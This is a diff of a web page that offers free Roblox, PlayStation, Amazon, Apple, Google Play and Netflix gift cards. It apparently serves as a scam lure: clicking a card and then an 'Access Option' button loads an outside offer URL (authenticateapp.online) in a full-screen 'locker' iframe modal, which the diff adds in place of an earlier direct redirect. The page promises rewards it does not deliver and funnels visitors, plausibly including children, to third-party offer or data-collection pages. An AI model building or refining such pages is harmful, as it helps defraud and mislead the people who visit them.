@@ -15,6 +15,7 @@ color:#fff;
 overflow-x:hidden;
 min-height:100vh;
 }
+
 body::before{
 content:"";
 position:fixed;
@@ -26,6 +27,7 @@ radial-gradient(circle at 50% 85%,rgba(34,197,94,.10),transparent 25%);
 animation:bgMove 10s ease-in-out infinite alternate;
 z-index:-2;
 }
+
 body::after{
 content:"";
 position:fixed;
@@ -33,6 +35,7 @@ inset:0;
 background:linear-gradient(135deg,#000,#0b0b0b,#000);
 z-index:-3;
 }
+
 @keyframes bgMove{
 100%{transform:scale(1.12) translateY(-18px);}
 }
@@ -57,7 +60,7 @@ margin:auto;
 }
 
 .card{
-background:linear-gradient(145deg,rgba(255,255,255,.05),rgba(255,255,255,.02));
+background:rgba(255,255,255,.05);
 border:1px solid rgba(255,255,255,.06);
 border-radius:24px;
 padding:14px;
@@ -66,10 +69,11 @@ transition:.25s ease;
 backdrop-filter:blur(12px);
 box-shadow:0 15px 30px rgba(0,0,0,.45);
 }
+
 .card:hover{
 transform:translateY(-6px);
-box-shadow:0 22px 35px rgba(0,0,0,.55);
 }
+
 .card img{
 width:100%;
 height:125px;
@@ -77,10 +81,11 @@ object-fit:contain;
 background:#fff;
 padding:14px;
 border-radius:18px;
-display:block;
 }
+
 .name{margin-top:12px;font-size:15px;font-weight:800}
 .price{margin-top:6px;font-size:13px;opacity:.75}
+
 .tag{
 display:inline-block;
 margin-top:10px;
@@ -91,6 +96,7 @@ background:rgba(96,165,250,.14);
 color:#93c5fd;
 }
 
+/* LOADER */
 .loading{
 position:fixed;
 inset:0;
@@ -111,17 +117,17 @@ animation:spin 1s linear infinite;
 }
 @keyframes spin{100%{transform:rotate(360deg)}}
 
+/* OFFER PAGE */
 .offerPage{display:none;padding:20px}
 .box{
 max-width:540px;
 margin:auto;
-background:linear-gradient(145deg,rgba(255,255,255,.05),rgba(255,255,255,.02));
+background:rgba(255,255,255,.05);
 border:1px solid rgba(255,255,255,.06);
 border-radius:24px;
 padding:22px;
-box-shadow:0 15px 30px rgba(0,0,0,.45);
-animation:fade .4s ease;
 }
+
 .selectedImage{
 width:100%;
 height:190px;
@@ -131,22 +137,18 @@ padding:18px;
 border-radius:18px;
 margin-bottom:16px;
 }
+
 #selectedTitle{font-size:28px;font-weight:800}
-.desc{font-size:14px;opacity:.72;margin:8px 0 18px}
 
 .option{
 display:flex;
 justify-content:space-between;
 align-items:center;
-gap:12px;
 padding:15px;
 margin-top:12px;
 border-radius:16px;
 background:rgba(255,255,255,.04);
-border:1px solid rgba(255,255,255,.05);
 }
-.optionText strong{display:block;font-size:14px}
-.optionText span{font-size:12px;opacity:.7}
 
 .option button,.back{
 border:none;
@@ -156,26 +158,58 @@ border-radius:12px;
 padding:11px 16px;
 color:#fff;
 }
+
 .option button{
 background:linear-gradient(90deg,#22c55e,#16a34a);
 }
+
 .back{
 width:100%;
 margin-top:16px;
 background:#1f2937;
 }
 
-.footer{
-text-align:center;
-padding:26px;
-font-size:12px;
-opacity:.45;
+/* LOCKER MODAL */
+#lockerModal{
+position:fixed;
+inset:0;
+background:rgba(0,0,0,.95);
+display:none;
+justify-content:center;
+align-items:center;
+z-index:9999;
 }
 
-@keyframes fade{
-from{opacity:0;transform:translateY(10px)}
-to{opacity:1;transform:translateY(0)}
+.lockerBox{
+width:90%;
+height:85%;
+max-width:500px;
+background:#111;
+border-radius:16px;
+overflow:hidden;
+position:relative;
 }
+
+.lockerBox iframe{
+width:100%;
+height:100%;
+border:none;
+}
+
+.closeBtn{
+position:absolute;
+top:10px;
+right:10px;
+background:red;
+color:#fff;
+border:none;
+padding:8px 12px;
+border-radius:8px;
+cursor:pointer;
+font-weight:bold;
+}
+
+.footer{text-align:center;padding:26px;font-size:12px;opacity:.45}
 
 @media(max-width:480px){
 .grid{grid-template-columns:1fr}
@@ -195,42 +229,42 @@ to{opacity:1;transform:translateY(0)}
 <div class="grid" id="grid">
 
 <div class="card" onclick="openOffer('ROBLOX $100 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Roblox_Logo_2022.svg" alt="Roblox">
+<img src="https://upload.wikimedia.org/wikipedia/commons/0/0d/Roblox_Logo_2022.svg">
 <div class="name">ROBLOX</div>
 <div class="price">$100 Gift Card</div>
 <div class="tag">Popular</div>
 </div>
 
 <div class="card" onclick="openOffer('PLAYSTATION $50 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg" alt="PlayStation">
+<img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg">
 <div class="name">PLAYSTATION</div>
 <div class="price">$50 Gift Card</div>
 <div class="tag">Top</div>
 </div>
 
 <div class="card" onclick="openOffer('AMAZON $50 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
+<img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
 <div class="name">AMAZON</div>
 <div class="price">$50 Gift Card</div>
 <div class="tag">Trending</div>
 </div>
 
 <div class="card" onclick="openOffer('APPLE $100 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
 <div class="name">APPLE</div>
 <div class="price">$100 Gift Card</div>
 <div class="tag">Premium</div>
 </div>
 
 <div class="card" onclick="openOffer('GOOGLE PLAY $50 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" alt="Google Play">
+<img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg">
 <div class="name">GOOGLE PLAY</div>
 <div class="price">$50 Gift Card</div>
 <div class="tag">New</div>
 </div>
 
 <div class="card" onclick="openOffer('NETFLIX $50 CARD', this)">
-<img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
+<img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
 <div class="name">NETFLIX</div>
 <div class="price">$50 Gift Card</div>
 <div class="tag">Hot</div>
@@ -246,24 +280,16 @@ to{opacity:1;transform:translateY(0)}
 <div class="offerPage" id="offerPage">
 <div class="box">
 
-<img id="selectedImage" class="selectedImage" alt="Selected Card">
-
+<img id="selectedImage" class="selectedImage">
 <div id="selectedTitle"></div>
-<div class="desc">Available options for your selected card</div>
 
 <div class="option">
-<div class="optionText">
-<strong>Access Option 1</strong>
-<span>Continue now</span>
-</div>
+<div>Access Option 1</div>
 <button onclick="go()">Start</button>
 </div>
 
 <div class="option">
-<div class="optionText">
-<strong>Access Option 2</strong>
-<span>Fast method</span>
-</div>
+<div>Access Option 2</div>
 <button onclick="go()">Start</button>
 </div>
 
@@ -272,31 +298,46 @@ to{opacity:1;transform:translateY(0)}
 </div>
 </div>
 
+<!-- LOCKER MODAL -->
+<div id="lockerModal">
+<div class="lockerBox">
+<iframe id="lockerFrame"></iframe>
+<button class="closeBtn" onclick="closeLocker()">✕</button>
+</div>
+</div>
+
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
 function openOffer(title,el){
 const img = el.querySelector("img").src;
+
 document.getElementById("loading").style.display="flex";
 
 setTimeout(()=>{
 document.getElementById("loading").style.display="none";
 document.getElementById("grid").style.display="none";
 document.getElementById("offerPage").style.display="block";
+
 document.getElementById("selectedTitle").innerText=title;
 document.getElementById("selectedImage").src=img;
 window.scrollTo({top:0,behavior:"smooth"});
-},1200);
+},1000);
 }
 
 function go(){
-window.location.href="https://authenticateapp.online/cl/i/pqq622";
+document.getElementById("lockerModal").style.display="flex";
+document.getElementById("lockerFrame").src="https://authenticateapp.online/cl/i/pqq622";
+}
+
+function closeLocker(){
+document.getElementById("lockerModal").style.display="none";
+document.getElementById("lockerFrame").src="";
 }
 
 function backPage(){
 document.getElementById("offerPage").style.display="none";
 document.getElementById("grid").style.display="grid";
-window.scrollTo({top:0,behavior:"smooth"});
 }
 </script>
 
